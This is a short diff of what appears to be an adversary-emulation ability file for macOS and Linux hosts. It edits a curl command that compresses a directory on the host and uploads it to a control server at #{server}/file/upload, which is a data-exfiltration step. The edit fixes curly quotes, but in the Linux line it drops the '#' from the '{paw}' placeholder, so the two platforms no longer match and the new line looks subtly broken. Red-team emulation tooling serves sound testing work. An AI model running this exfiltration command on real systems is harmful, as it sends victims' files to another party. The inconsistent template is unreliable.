@@ -11,11 +11,11 @@
     darwin:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress}" --header “X-Request-ID: #{paw}” #{server}/file/upload
+          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: #{paw}" #{server}/file/upload
     linux:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress}" --header “X-Request-ID: #{paw}” #{server}/file/upload
+          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: {paw}" #{server}/file/upload
     windows:
       psh,pwsh:
         command: |
